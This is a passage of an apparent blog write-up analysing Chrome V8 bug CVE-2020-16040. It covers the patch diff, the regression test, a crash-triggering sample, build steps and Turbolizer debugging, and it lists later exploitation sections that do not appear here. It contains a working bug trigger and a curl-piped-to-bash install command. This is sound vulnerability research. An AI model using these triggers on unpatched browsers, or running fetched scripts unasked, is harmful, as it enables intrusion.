<!--
````````````````````````````````````````````````````````````````
````````````````````````````:'+##+',````````````````````````````
````````````````````````:##############.````````````````####````
``````````````````````+##################:````````````,#####+```
````````````````````'######################,``````````#######```
```````````````````##+';:::;'+###############````````########```
``````````````````.``` ,'+@###################``````.#######+```
````````````````````+##########################`````+####+.`````
`````````````````,##############################````####````````
````````````````#################################`:'###`````````
``````````````:#######################################:``.,`````
`````````````'#########################################,#####```
````````````,################################################'``
````````````#################################################;``
```````````.###################@########################   ,'```
```````````##############;.``````````,'################,````````
```````````###########.``````````````````;#############`````````
``````````.########+```````````````````````.##########``````````
``````````'#######```````````````````````````:#######.``````````
``````````######+``````````````````````````````######:``````````
``````````######```````````````````````````````.#####'``````````
``````````#####`````````````````````````````````######``````````
``````````####'````++':````````````````` ,'+#.```#####``````````
``````````####.``````;###'````````````:###+``````#####``````````
``````````####```````######:`````````#####+``````'####``````````
``````````####``````#########``````:########`````;####``````````
``````````####`````,########:#````'#########`````;####``````````
``````````#### `````########````````########`````'####``````````
``````````####.``````+####'``````````+####'``````#####``````````
``````````####+````````  `````````````` ````````.#####``````````
``````````#####`````````````````````````````````######``````````
``````````######```````````````````````````````;######``````````
``````````#######`````````````````````````````,#######``````````
``````````########``````````'######.`````````+########``````````
``````````##########,````.###########:`````+##########``````````
``````````,##########################################+``````````
```````````##########################################.``````````
```````````##########################################```````````
````````````########################################.```````````
````````````+#######################################````````````
`````````````######################################`````````````
`````````````,####################################;`````````````
``````````````+###################################``````````````
``````````:````##################################```````````````
``````````#.````################################`````@``````````
``````````##`````##############################`````##``````````
``````````###`````###########################+`````###``````````
``````````####.````#########################.`````####``````````
``````````#####;````:#####################;`````'#####``````````
``````````#######`````##################:``````######'``````````
``````````,#######.`````:+##########+:``````.########```````````
```````````;########``````````````````````;#########````````````
`````````````+########`````,+;,.````.,;##########+,`````````````
```````````````,+#######,`````.'#############+;.````````````````
```````````````````,;#####+, ````` `.,,,,.``````````````````````
```````````````````````` `..,,.`````````````````````````````````
````````````````````````````````````````````````````````````````
-->
<html>
<head>
<meta name="Description" content="CVE-2020-16040 Analysis and Exploitation - A Chrome V8 Engine Browser Exploit (Simplified Lowering)">
<link rel="stylesheet" href="../Resources/css/hack.css">
<link rel="stylesheet" href="../Resources/css/themes/dark.css">
<link rel="stylesheet" href="../Resources/highlight/styles/custom.min.css">
<script src="../Resources/highlight/highlight.min.js"></script>
<script>hljs.highlightAll();</script>
<title>CVE-2020-16040 Analysis and Exploitation</title>
</head>
<script>
  document.addEventListener('DOMContentLoaded', function() {
    var elements = document.querySelectorAll('body *');
    elements.forEach(function(element) {
      element.innerHTML = element.innerHTML.replace(/<code>([^</code>]+)`/g, '<span class="marked-text">$1</span>');
    });
  });
</script>

<p>
<center><img src="../images/ret_logo.png" width="80"></center><br>
<center>((((&lambda;f.(&lambda;x.(fx)))(&lambda;y.y))(&lambda;z.z)))</center>
<p>
<center><< <a href="../index.html">home</a> >></center>
<body class="hack dark">
  <div class="main container">
<h1><font color="white">0x02a: CVE-2020-16040 ANALYSIS & EXPLOITATION</font></h1>

 <script>
  document.addEventListener('DOMContentLoaded', function() {
    var elements = document.querySelectorAll('body *');
    elements.forEach(function(element) {
      element.innerHTML = element.innerHTML.replace(/<code>([^</code>]+)`/g, '<span class="marked-text" style="background-color: #f8f8f8; color: #333; padding: 2px 4px; border-radius: 4px; font-family: monospace;">$1</span>');
    });
  });
</script>
<!-- Show/Hide Button -->
<button id="toggleButton" onclick="toggleToC()" style="background-color: #14171E; color: white; font-size: 14px; padding: 8px 12px; border: none; border-radius: 4px; cursor: pointer;"><b>show table of contents</b></button>

<p></p>

<!-- ToC Container -->
<pre class="hack dark" id="toc-container" style="display: none;">
   _      ___            _____          _____
  | |__  / _ \ _ __ ___ |___ /  ___ _ _|___ /_      __
  |  _ \| | | |  _   _ \  |_ \ / __|  __||_ \ \ /\ / /
  | | | | |_| | | | | | |___) | (__| |  ___) \ V  V /
  |_| |_|\___/|_| |_| |_|____/ \___|_| |____/ \_/\_/
  
  +-----[ fourteen karat gold slum computer wizard ]-----+
  
  ret2eax@h0m3cr3w:~$ ./content.sh
  
  listing content..
  
  [1.] PREFACE
  [2.] A FIRST GLANCE AT THE BUG 
  [3.] BUILDING V8 & TRIGGERING THE BUG
  [4.] UNDERSTANDING THE REGRESSION
    [4.1] USING TURBOLIZER TO DEBUG TURBOFAN'S SEA-OF-NODES
    [4.2] THE SIMPLIFIED LOWERING PHASE & ITS SUBPHASES
      [4.2.1] THE PROPAGATE PHASE: `RunPropagatePhase();`
      [4.2.2] THE RETYPE PHASE: `RunRetypePhase();`
      [4.2.3] THE LOWERING PHASE: `RunLoweringPhase();`
      [4.2.4] EXPLORING `CanOverflowSigned32();` 
    [4.3] ANSWERING OUR OPEN ENDED QUESTIONS
  [5.] EXPLOITABILITY
    [5.1] LEVERAGING THE SIGNED INTEGER OVERFLOW WITH A TYPER HARDENING BYPASS TO ATTAIN OUT-OF-BOUNDS
      [5.1.1] TFBytecodeGraphBuilder
      [5.1.2] TFInlining
      [5.1.3] TFTypedLowering
      [5.1.4] TFLoadElimination
    [5.2] OVERWRITING THE LENGTH OF ARRAY `COR`
    [5.3] CONSTRUCTING `AddrOf` and `FakeObj` PRIMITIVES
    [5.4] FROM OOB R/W TO REMOTE CODE EXECUTION (RCE) USING WEB ASSEMBLY (WASM)
    [5.5] SHELLCODE WEAPONISATION
    [5.6] INCREASING EXPLOIT RELIABILITY
      [5.6.1] EXPLOIT ABORT DEFINITIONS & ENUMERATION FOR ALTERNATIVE PAYLOAD DELIVERY
        [5.6.1.1] EXPLOIT AGAINST VULNERABLE VERSION OF CHROME
        [5.6.1.2] EXPLOIT AGAINST NON-VULNERABLE VERSION OF CHROME
        [5.6.1.3] EXPLOIT AGAINST COMPLETELY DIFFERENT BROWSER I.E FIREFOX
        [5.6.1.4] EXPLOIT ENUMERATES TARGET OS VIA `getTargetOS();`
        [5.6.1.5] EXPLOIT AGAINST LINUX SYSTEM
        [5.6.1.6] EXPLOIT AGAINST WINDOWS SYSTEM
        [5.6.1.7] EXPLOIT AGAINST OSX PRIOR TO INTEGRATING SUPPORT
        [5.6.1.8] EXPLOIT AGAINST OSX AFTER INTEGRATING SUPPORT
    [5.2] CURRENT RELIABILITY OF EXPLOIT
      [5.2.1] TODOs
  [6.] REFERENCES  
  ___________________________________________________________________</pre>
  <!-- JavaScript -->
<script>
  function toggleToC() {
    var toc = document.getElementById("toc-container");
    var button = document.getElementById("toggleButton");
    if (toc.style.display === "none") {
      toc.style.display = "block";
      button.innerHTML = "hide table of contents";
    } else {
      toc.style.display = "none";
      button.innerHTML = "show table of contents";
    }
  }
</script>
<h2><font color="white">[ PREFACE ]</font></h2> 
<p>First and foremost, I would like to express my appreciation to the researchers who have laid the groundwork and generously shared their knowledge, which has greatly assisted me in tackling my first Chrome V8 bug. You know who you are.</p>
<p>I would especially like to acknowledge <code>Jeremy "__x86" Fetiveau</code>, <code>Faith</code>, <code>K4Fr</code>, <code>muntu</code>, <code>willsroot</code>, and the guys at <code>Singular Security Lab</code> for their contributions.</p>

<p>I tried to provide as much detail as possible where a lot of the content could probably have been stripped out, though I feel like this verbosity may be of use to someone out there. If you identify any errors, have questions or feedback please do <a href="mailto:homecrew@riseup,net">let me know</a>, as this is highly encouraged. With that being said, let's dive into it.</p>
<p>You can view my final <code>exploit</code> located in my GitHub repository <a href="https://github.com/ret2eax/exploits/tree/main/CVE-2020-16040">here</a>. </p>

<h2><font color="white">[ A FIRST GLANCE AT THE BUG ]</font></h2>

<p>Looking at the published CVE ID associated with this particular vulnerability (<code>CVE-2020-16040</code>), a <a href="https://crbug.com/1150649">chrome bug tracker</a> reference is provided that contains additional information in in pertinence to the vulnerability specifics. We can attain further details in the following <a href="https://chromium-review.googlesource.com/c/v8/v8/+/2557498">commit</a> including the patch diff, patch commit and the disclosed regression test (<code>regress-1150649.js</code>), which will be looked at later.</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-plaintext">
[compiler] Fix a bug in SimplifiedLowering

SL's VisitSpeculativeIntegerAdditiveOp was setting Signed32 as
restriction type even when relying on a Word32 truncation in
order to skip the overflow check. This is not sound.
</code>
</pre>
<p>The vulnerable version of V8 in question is associated with commit <code>2781d585038b97ed375f2ec06651dc9e5e04f916</code>.</p>

<p>The patch diff can be seen below:</p>
<pre style="background-color: #100E15; border: none !important;">
<code>
diff --git a/src/compiler/simplified-lowering.cc b/src/compiler/simplified-lowering.cc
index a1f10f98fe5..ef56d56e447 100644
--- a/src/compiler/simplified-lowering.cc
+++ b/src/compiler/simplified-lowering.cc
@@ -1409,7 +1409,6 @@ class RepresentationSelector {
                 IsSomePositiveOrderedNumber(input1_type)
             ? CheckForMinusZeroMode::kDontCheckForMinusZero
             : CheckForMinusZeroMode::kCheckForMinusZero;
-
     NodeProperties::ChangeOp(node, simplified()->CheckedInt32Mul(mz_mode));
   }
 
@@ -1453,6 +1452,13 @@ class RepresentationSelector {
 
     Type left_feedback_type = TypeOf(node->InputAt(0));
     Type right_feedback_type = TypeOf(node->InputAt(1));
+
+    // Using Signed32 as restriction type amounts to promising there won't be
+    // signed overflow. This is incompatible with relying on a Word32
+    // truncation in order to skip the overflow check.
+    Type const restriction =
+        truncation.IsUsedAsWord32() ? Type::Any() : Type::Signed32();
+
     // Handle the case when no int32 checks on inputs are necessary (but
     // an overflow check is needed on the output). Note that we do not
     // have to do any check if at most one side can be minus zero. For
@@ -1466,7 +1472,7 @@ class RepresentationSelector {
         right_upper.Is(Type::Signed32OrMinusZero()) &&
         (left_upper.Is(Type::Signed32()) || right_upper.Is(Type::Signed32()))) {
       VisitBinop<T>(node, UseInfo::TruncatingWord32(),
-                    MachineRepresentation::kWord32, Type::Signed32());
+                    MachineRepresentation::kWord32, restriction);
     } else {
       // If the output's truncation is identify-zeros, we can pass it
       // along. Moreover, if the operation is addition and we know the
@@ -1486,8 +1492,9 @@ class RepresentationSelector {
       UseInfo right_use = CheckedUseInfoAsWord32FromHint(hint, FeedbackSource(),
                                                          kIdentifyZeros);
       VisitBinop<T>(node, left_use, right_use, MachineRepresentation::kWord32,
-                    Type::Signed32());
+                    restriction);
     }
+
     if (lower<T>()) {
       if (truncation.IsUsedAsWord32() ||
           !CanOverflowSigned32(node->op(), left_feedback_type,
diff --git a/test/mjsunit/compiler/regress-1150649.js b/test/mjsunit/compiler/regress-1150649.js
new file mode 100644
index 00000000000..a193481a3a2
--- /dev/null
+++ b/test/mjsunit/compiler/regress-1150649.js
@@ -0,0 +1,24 @@
+// Copyright 2020 the V8 project authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+
+// Flags: --allow-natives-syntax
+
+function foo(a) {
+  var y = 0x7fffffff;  // 2^31 - 1
+
+  // Widen the static type of y (this condition never holds).
+  if (a == NaN) y = NaN;
+
+  // The next condition holds only in the warmup run. It leads to Smi
+  // (SignedSmall) feedback being collected for the addition below.
+  if (a) y = -1;
+
+  const z = (y + 1)|0;
+  return z < 0;
+}
+
+%PrepareFunctionForOptimization(foo);
+assertFalse(foo(true));
+%OptimizeFunctionOnNextCall(foo);
+assertTrue(foo(false));
</code>
</pre>

<h2><font color="white">[ BUILDING V8 & TRIGGERING THE BUG ]</font></h2>
<p>The following environment was built on Ubuntu 64-bit version <code>20.04.5</code>.</p>
<p>pull depot_tools:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
</code>
</pre>
set <code>PATH</code>:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
export PATH=$(pwd)/depot_tools:$PATH
</code>
</pre>
<code>fetch</code> V8:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
fetch v8
cd v8
./build/install-build-deps.sh                 #<-- linux
</code>
</pre>
Revert to vulnerable commit of V8:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
git checkout 2781d585038b97ed375f2ec06651dc9e5e04f916
gclient sync
</code>
</pre>
<b>NOTE</b> the patch file is seen to be associated with commit <code>ba1b2cc09ab98b51ca3828d29d19ae3b0a7c3a92</code> :
<pre style="background-color: #100E15; border: none !important;">
<code class="language-plaintext">
[compiler] Fix a bug in SimplifiedLowering

SL's VisitSpeculativeIntegerAdditiveOp was setting Signed32 as
restriction type even when relying on a Word32 truncation in
order to skip the overflow check. This is not sound.
</code>
</pre>
You can <code>wget</code> and then <code>git apply ba1b2cc09ab98b51ca3828d29d19ae3b0a7c3a92.diff</code> the patch file if desired. This will patch the vulnerable function and so it is not relevant here unless  wanting to compare output between a patched vs unpatch branch for debugging purposes (will get to this later). 
<p>Proceed to build/compile the debug and release versions of V8 which is associated to the vulnerable commit. I used the 'all-in-one script' <code>gm.py</code> as opposed to the 'convenience' script <code>v8gen.py</code>, though either would suffice:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
./tools/dev/gm.py x64.release
ninja -C ./out.gn/x64.release
./tools/dev/gm.py x64.debug
ninja -C ./out.gn/x64.debug
</code>
</pre>
For ease of debugging, I also used GDB GEF:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
</code>
</pre>
I also integrated V8's tool/support script to get access to additional commands in gdb such as <code>telescope</code> and <code>job</code>:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
source /path/to/v8/tools/gdbinit
source /path/to/v8/tools/gdb-v8-support.py
</code>
</pre>
We can test the build with the following trigger <code>sample.js</code> as provided in the <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1150649">chromium bug tracker</a> (referenced at the beginning of this report). It should be noted that this sample was generated by the researcher while fuzzing V8: 
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
./d8 sample.js --allow-natives-syntax
</code>
</pre>
<code>sample.js</code>: 
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
function jit_func(a, b) {
  var v921312 = 0xfffffffe;
  let v56971 = 0;  
  var v4951241 = [null, (() => {}), String, "string", v56971];
  let v129341 = [];

  v921312 = NaN;

  if (a != NaN) {
      v921312 = (0xfffffffe)/2;
  }

  if (typeof(b) == "string") {
      v921312 = Math.sign(v921312);
  }

  v56971 = 0xfffffffe/2 + 1 - Math.sign(v921312 -(-0x1)|6328);

  if (b) {
    v56971 = 0;
  }

  v129341 = new Array(Math.sign(0 - Math.sign(v56971)));
  v129341.shift();
  v4951241 = {};
  v129341.shift();

  v4951241.a = {'a': v129341};  

  for (let i = 0; i < 7; i++)
  {
    v129341[5] = 2855;
  }

  return v4951241;
}

%PrepareFunctionForOptimization(jit_func);
jit_func(undefined, "KCGKEMDHOKLAAALLE").toString();
%OptimizeFunctionOnNextCall(jit_func);
jit_func(NaN, undefined).toString();
</code>
</pre>
This produced the following expected output (<code>./d8 --allow-natives-syntax sample.js</code>):

<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
Received signal 11 SEGV_ACCERR 135c0818d000

==== C stack trace ===============================

 [0x55f41c8ae9d7]
 [0x7f2259c88420]
 [0x7f2259a999d3]
 [0x55f41bf5ceb9]
 [0x55f41bf5ce25]
 [0x55f41c0a07d9]
 [0x55f41be3bdef]
 [0x55f41c79ba58]
[end of stack trace]
Segmentation fault (core dumped)
</code>
</pre>
While the above is interesting, the provided regression was simpler to work off, and so this is what lead into the next segment.<p></p>

<h2><font color="white">[ UNDERSTANDING THE REGRESSION ]</font></h2>
<p>As stated earlier, with <code>CVE-2020-16040</code> having been patched in later versions, a corresponding regression, <code>regress-1150649.js</code> was also publicly provided:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
// Copyright 2020 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax

function foo(a) {
	var y = 0x7fffffff; // 2^31 - 1 (INT_MAX)
	
	// Widen the static type of y (this condition never holds).
	if (a == NaN) y = NaN;
	
	// The next condition holds only in the warmup run. It leads to Smi
	// (SignedSmall) feedback being collected for the addition below.
	if (a) y = -1;

	const z = (y + 1)|0;
	return z < 0;
}

%PrepareFunctionForOptimization(foo);
assertFalse(foo(true));
%OptimizeFunctionOnNextCall(foo);
assertTrue(foo(false));
</code>
</pre>
The above <a href="https://chromium-review.googlesource.com/c/v8/v8/%2B/2557498/2/test/mjsunit/compiler/regress-1150649.js">regress-1150649.js</a> is developed for regression testing that provides a means to test and verify that the available patch has been implemented properly. If the regress test fails, it indicates that the patch was not deployed properly. While limited, this regression also illustrates how the vulnerability can be triggered. We can modify and use this later on to further understand the vulnerability and apply our understanding to the proof-of-concept (PoC) phase.  

<p><b>NOTE</b> I slightly modified the above regress and incorporated <code>console.log()</code> values to represent <code>assertTrue</code> and <code>assertFalse</code>, and also ran these twice; prior to optimisation, and also after optimisation:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
// Flags: --allow-natives-syntax

function foo(a) {
        //...
}

console.log("[+] Before Optimisation (z<0?):");
console.log(foo(true)); //assertFalse(foo(true));
console.log(foo(false)); //assertTrue(foo(false));

console.log("[+] After Optimisation (z<0?):");
%PrepareFunctionForOptimization(foo); //first call to foo (warmup run)
console.log(foo(true)); //assertFalse(foo(true));
%OptimizeFunctionOnNextCall(foo); //second call to foo - optimises here
console.log(foo(false)); //assertTrue(foo(false));
</code>
</pre>
<p></p>Following the code of the regression, we can conclude in simple terms that:

<p></p>Variable <code>y</code> is set to <code>0x7fffffff</code> a hexadecimal representation of <code>2147483647</code>, of which, represents the maximum possible value for a 32-bit signed binary integer. This is <code>INT_MAX</code>.

<p></p>The <code>if (a == NaN) y = NaN</code>; condition is an equality operator condition. According to the regress, it is stated that this widens the static type of <code>y</code>, and in doing so this condition never holds. This will be investigated further below. 

<p></p>The next condition <code>if (a) y = -1</code>; is said to hold only in the warmup run and leads to SMI (Signed Small Integer), which is type feedback being collected for the operation highlighted below:

<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
const z = (y + 1)|0;
return z < 0;
</code>
</pre>
The above <code>z</code> takes the SMI feedback, <code>y</code> with an addition of <code>+1</code> before being bitwise OR'd against the value of <code>0</code>. The boolean value of <code>z</code> is then returned while being compared to the <code>&lt; 0</code> logic. 
<p>Looking at it more technically:</p>
<p><code>y</code> is set to <code>0x7fffffff</code> as stated earlier above.</p>
<p>The first call to <code>foo</code> via intrinsic function <code>%PrepareFunctionForOptimization(foo);</code> returns <code>false</code> as it is expected to (before optimisation). The reason being is that the argument <code>a</code> will return <code>true</code> resulting in <code>y</code> being set from <code>0x7fffffff</code> to <code>-1</code>. This will cause <code>z</code> to be set to <code>(-1+1)|0</code> which results in <code>0</code> being bitwise OR'd with <code>0</code> resulting in the result of <code>0</code> before being parsed to the <code>return z &lt; 0</code> logic, being <code>0 < 0</code> which results in the boolean result of <code>false</code>, as was expected.</p>
<p>The second call to <code>foo</code> via intrinsic function <code>%OptimizeFunctionOnNextCall(foo);</code> the argument <code>a</code> will return <code>false</code>, causing <code>z</code> to be set to <code>y+1</code> which would equate to <code>0x7fffffff+1</code> equaling <code>0x80000000</code> which is then bitwise OR'd with <code>0</code> before being parsed to the <code>return z < 0;</code> logic. However, it is important to note that in two's complement notation, integer representations always goes from the highest expressible number to the lowest expressible number. Meaning <code>INT_MAX +1</code> would result in wrapping around to value of <code>INT_MIN</code>, being <code>-2147483648</code> (signed 32-bit integer). This is what happens with a signed integer overflow. A 32-bit signed integer has a minimum value of <code>-2147483648</code>, and a maximum value of <code>2147483648</code> inclusive. Since <code>0x7fffffff</code> is the hexadecimal representation of <code>INT_MAX</code>, the addition of <code>+1</code> results in the value returning as the <code>INT_MIN</code> value of the 32-bit signed integer. Therefore, <code>0x80000000</code> bitwise OR'd with <code>0</code> equals <code>-2147483648</code> (<code>INT_MIN</code>).</p>
<p>As a result, when <code>z</code>, being <code>-2147483648</code> is parsed to the <code>return z < 0</code> logic comparison, since the value is <code>-2147483648</code>, this should result in the boolean result <code>true</code>. Which it does prior to optimisation, but not after optimisation by the JIT compiler (TurboFan). We can therefore deduce that the bug causes the JIT compiler to incorrectly assume that an integer overflow has not occurred, when it actually <b>has</b>. This is the vulnerability, and you can see the following output when running the above modified regression PoC:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
./d8 regression.js --allow-natives-syntax
   
   [+] Before Optimisation (z<0?):
   false
   true
   [+] After Optimisation (z<0?):
   false             <--- prepared for optimisation, but not actually optimised
   false             <--- optimised
</code>
</pre>
 In addition to the above, if we remove the <code>return z < 0;</code> line and replace this with <code>return z;</code> we get the following output:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
[+] Before Optimization (z<0?):
0              #return z < 0; is false as seen during previous output (expected)
-2147483648    #return z < 0; is true as seen during previous output (expected)
[+] After Optimization (z<0?):
0              #return z < 0; is false as seen during previous output (expected)
-2147483648    #return z < 0; is false when it should return true (unexpected)
</code>
</pre>
Based on the above point; we know that some JIT compiler specific process (in this case TurboFan) allows the vulnerability to be triggered during optimisation. This is where we need to start looking next to understand what exactly triggers the vulnerability during optimisation and therefore how the vulnerability can potentially be exploited. 
<p>Before moving on, it is also interesting to comment out the condition that widens the static type of <code>y</code> and re-running the regression.</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
function foo(a) {
    //...
        // Widen the static type of y (this condition never holds).
        //if (a == NaN) y = NaN;  
    //...
}
</code>
</pre>
The output results in a significant change, with the expected output, of which is contrary to what was demonstrated above. The vulnerability in this case, was not triggered. Why? This is something we need to determine:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-sh">
[+] Before Optimization (z<0?):
false
true
[+] After Optimization (z<0?):
false              <--- prepared for optimisation, but not actually optimised
true               <--- optimised
</code>
</pre>
Research on this vulnerability was excessively broad and without any prior background on V8 or V8's internals, there was a tremendous amount of reading and preparation needed before being able to begin looking at the vulnerability in question. In regards to <a href="https://faraz.faith/2021-01-07-cve-2020-16040-analysis/">Faith's analysis</a>, a good point was raised, in that; open ended questions can provide a goal to work towards, as opposed to, “analyse and understand the bug, which is not as achievable because of its broad nature". As a result, this same approach was taken, that devised the following set of questions of which naturally are similar in nature.
<p></p>With the above analysis of the regression in consideration, some interesting questions are raised;
<p></p>1. In regards to V8 internals, what exactly is the process associated with the <code>%PrepareFunctionForOptimization();</code> and <code>%OptimizeFunctionOnNextCall();</code> intrinsic functions? 
<p></p>2. Why does this static type of <code>y</code> need to be widened here? What is the purpose of the condition <code>if (a == NaN) y = NaN;</code> and how is this implemented?
<p></p>3. During the warmup run, being the first call to <code>foo</code>; What is the purpose of making the type feedback of <code>y</code> SignedSmall? How is this then collected?
<p></p>4. Why is <code>z</code> defined as <code>(y+1)|0</code>, what is the purpose of the bitwise OR operation with <code>0</code>?
<p></p>5. Finally, there are some open ended questions answered after exploitation in regards to the nature of the exploit, as well as its reliability, and what can be done further to increase said reliability.
<p>The first question can be answered, and is in pertinence to V8's intrinsic functions, particularly <code>%PrepareFunctionForOptimization();</code> and <code>%OptimizeFunctionOnNextCall();</code>. After researching more about V8's internals, <code>%PrepareFunctionForOptimization(foo);</code> appears to make sure that the <code>foo</code> function can collect type feedback from the interpreter (Ignition) for speculative optimisation, meaning that the code generated will be made upon assumptions of the <code>foo</code> function based upon the type feedback received from the interpreter, and that its byte code is not flushed away by V8's garbage collector:</p>

<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
RUNTIME_FUNCTION(Runtime_PrepareFunctionForOptimization) {
//...

// If optimization is disabled for the function, return without making it
// pending optimize for test.
if (function->shared().optimization_disabled() &&
	function-&gt;shared().disabled_optimization_reason() ==
		BailoutReason::kNeverOptimize) {
	return CrashUnlessFuzzing(isolate);

//...

// Hold onto the bytecode array between marking and optimization to ensure
// it's not flushed.
if (v8_flags.testing_d8_test_runner) {
	PendingOptimizationTable::PreparedForOptimization(isolate, function, allow_heuristic_optimization);
}
return ReadOnlyRoots(isolate).undefined_value();
}
</code>
</pre>
Where; <code>%OptimizeFunctionOnNextCall(foo);</code> appears to mark the function of <code>foo</code> for optimisation i.e. what normally happens with hot functions (functions that are called many times) before being consumed by TurboFan, where the code is optimised and compiled:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
Object OptimizeFunctionOnNextCall(RuntimeArguments& args, Isolate* isolate) {
//...
TraceManualRecompile(*function, kCodeKind, concurrency_mode);
JSFunction::EnsureFeedbackVector(isolate, function, &is_compiled_scope);
function->MarkForOptimization(isolate, CodeKind::TURBOFAN, concurrency_mode);
return ReadOnlyRoots(isolate).undefined_value();
}
</code>
</pre>
A curated list of the various intrinsic functions, and some of their definitions are referenced within V8's <code>/src/runtime/runtime.h</code> and <code>/src/runtime/runtime-test.cc</code> source files.
<p></p>

<h3><font color="white">[ USING TURBOLIZER TO DEBUG TURBOFAN'S <code>SEA-OF-NODES</code> ]</font></h3>
<p><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">"Nodes can represent arithmetic operations, load, stores, calls, constants and so on. There are three types of edges; control edges, value edges and effect edges."</a></p>
<p>This visual graph offered by V8's turbolizer assists in the debugging phase.</p>
<p>Setup Turbolizer:</p>
<pre style="background-color: #100E15; border: none !important;">
<code class="language-js">
cd /path/to/v8/tools/turbolizer
npm i
npm run-script build
python3 -m http.server 80
</code>
</pre>
Can then point the browser to <code>localhost:80</code> for the web-based interface (alternatively we could also use V8's public <a href="https://v8.github.io/tools/head/turbolizer/index.html">GitHub turbolizer interface</a>.

<p></p>Turbolizer works by importing <code>.json</code> files that can be generated by running V8 with <code>--trace-turbo</code> flag. For example, you can run JavaScript with V8 via <code>./out.gn/x64.release/d8 test.js --trace-turbo</code> which will output a <code>turbo-*-*.json</code> file which can then be imported into Turbolizer's web interface for debugging.

<p></p>After running the debugging version of V8 with various modified PoCs, it was noticed that the optimisation pipeline contains various phases and are executed in a relevant sequence accordingly. As a result, it was identified that the Escape Analysis phase was the predecessor phase to the Simplified Lowering phase. This is also confirmed within the <code>src/compiler/pipeline.cc</code> source:
<pre style="background-color: #100E15; border: none !important;">
<code class="language-cpp">
bool PipelineImpl::OptimizeGraph(Linkage* linkage) {
  //...

  if (FLAG_turbo_escape) {
    Run&lt;EscapeAnalysisPhase&gt;();
    //...
  }
  // Perform simplified lowering. This has to run w/o the Typer decorator,
  // because we cannot compute meaningful types anyways, and the computed types
  // might even conflict with the representation/truncation logic.
  Run&lt;SimplifiedLoweringPhase&gt;(linkage);
  //...
}
</code>
</pre>
<b> Notes on the aforementioned phases and their stages</b>>
<p></p>
Different stages have different optimisation rules, which mainly include the following:

<p></p>1.  <code>BytecodeGraphBuilder</code>: convert bytecode to graph.
<p></p>2.   <code>InliningPhase</code>: Inline function expansion.
<p></p>3.  <code>TyperPhase</code>: Determine the node type and scope.
<p></p>4.   <code>TypedLoweringPhase</code>: Converts JS Node to an intermediate Simplified Node or Common Node.
<p></p>5.   <code>LoadEliminationPhase</code>: Eliminate redundant load memory read operations.
<p></p>6.   <code>EscapeAnalysisPhase</code>: Mark whether the node escapes and modify it.
<p></p>7.   <code>SimplifiedLoweringPhase</code>: Downgrade a Simplified Node node to a more specific Machine Node.
<p></p>8.   <code>GenericLoweringPhase</code>: Reduce the operator of JS Node to Runtime, Builtins, IC call level.
<p>Similar to how the widening of the static type of <code>y</code> was included and then removed to monitor output differences in the modified regression previously above; we can debug this further by analysing V8's nodes associated with the Escape Analysis and the vulnerable Simplified Lowering phase to determine differences between the propagation/lowering of nodes.</p>
<p></p>

<b>Turbolizer Graph of Nodes in the Escape Analysis Phase with Widening Condition</b>
<p><center><img src="../images/escphase_w_widen.png"></center></p>
<p></p>It is evident above, that despite the widening condition being present or not within the regression ran against the patched version of V8, the output remains the same. The <code>Uint32LessThan</code> node is always an <code>Int32LessThan</code> node. However, the above two outputs in comparison to the previous turbolizer outputs of the unpatched version; only with the widening condition present we notice a difference, being that the control edge from the  <code>Word32Or</code> node, is to that of the <code>Int32LessThan</code> node in the patched version, and not the<code>Uint32LessThan</code> node when compared to the unpatched version (see further above).
<p></p><b>Turbolizer Graph of Nodes in the Escape Analysis Phase without Widening Condition</b>
<p><center><img src="../images/escphase_wo_widen.png"></center></p>
<p><b>NOTE</b> the above strictly focuses solely on the differences in nodes within the Escape Analysis phase regarding the condition that widens the static type of <code>y</code>. The above highlights that there are no changes within the Escape Analysis phase when compared to redacting this condition, or it being present.</p>
<p>There are however, changes during the Simplified Lowering phase. This is illustrated below.</p>
<b>Turbolizer Graph of Nodes in the Simplified Lowering Phase with Widening Condition:</b>
<p>The following image shows the nodes associated with the Simplified Lowering phase, whereby, the  <code>if (a == NaN) y = NaN;</code> condition is present:</p>
<p><center><img src="../images/slphase_w_widen.png"></center></p>
<b>Turbolizer Graph of Nodes in the Simplified Lowering Phase without Widening Condition:</b>
<p><center><img src="../images/slphase_wo_widen.png"></center></p>
<p>Notably, the differences between the two turbolizer graphs highlight that with the widening condition, being <code>if (a == NaN) y = NaN;</code>when present, the <code>NumberLessThan</code> node from the Escape Analysis becomes a <code>Uint32LessThan</code> node within the Simplified Lowering phase. When redacting this widening condition, the same <code>NumberLessThan</code> node from the Escape Analysis phase becomes an <code>Int32LessThan</code> node within the Simplified Lowering phase. Since the sea-of-nodes analysed here are in relation to this widening condition, this node is applied to the final <code>return z < 0</code> logic comparison. We can further deduce that TurboFan fails to identify this widening condition as problematic, and therefore fails to catch the integer overflow that occurs during the operation of <code>(y+1)|0</code>. The reason being is that, with the widening condition present, the Simplified Lowering phase within TurboFan attempts to compare the two numbers as unsigned 32-bit integers, as opposed to signed 32-bit integers. </p>
